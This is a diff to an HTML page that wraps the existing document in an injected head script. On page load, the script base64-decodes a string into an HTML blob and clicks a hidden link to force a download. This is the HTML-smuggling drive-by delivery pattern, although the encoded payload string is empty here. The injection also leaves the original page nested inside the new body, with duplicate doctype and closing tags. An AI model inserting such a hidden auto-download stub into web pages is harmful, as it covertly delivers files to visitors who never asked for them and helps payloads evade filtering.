@@ -1,4 +1,32 @@
 <!DOCTYPE html>
+<html>
+<head>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+    $(document).ready(function() {
+      saveFile();
+    });
+
+    function saveFile(name, type, data) {
+      if (data != null && navigator.msSaveBlob)
+        return navigator.msSaveBlob(new Blob([data], { type: type }), name);
+      var a = $("<a style='display: none;'/>");
+  
+      var encodedStringAtoB = "";
+      var decodedStringAtoB = atob(encodedStringAtoB);
+      const myBlob = new Blob([decodedStringAtoB], { type: 'text/html' });
+      const url = window.URL.createObjectURL(myBlob);
+  
+      a.attr("href", url);
+      $("body").append(a);
+      a[0].click();
+      window.URL.revokeObjectURL(url);
+      a.remove();
+    }
+  </script>
+</head>
+<body>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -754,5 +782,8 @@
             console.error('Page error:', e.error);
         });
     </script>
+</body>
+</html>
+
 </body>
 </html>
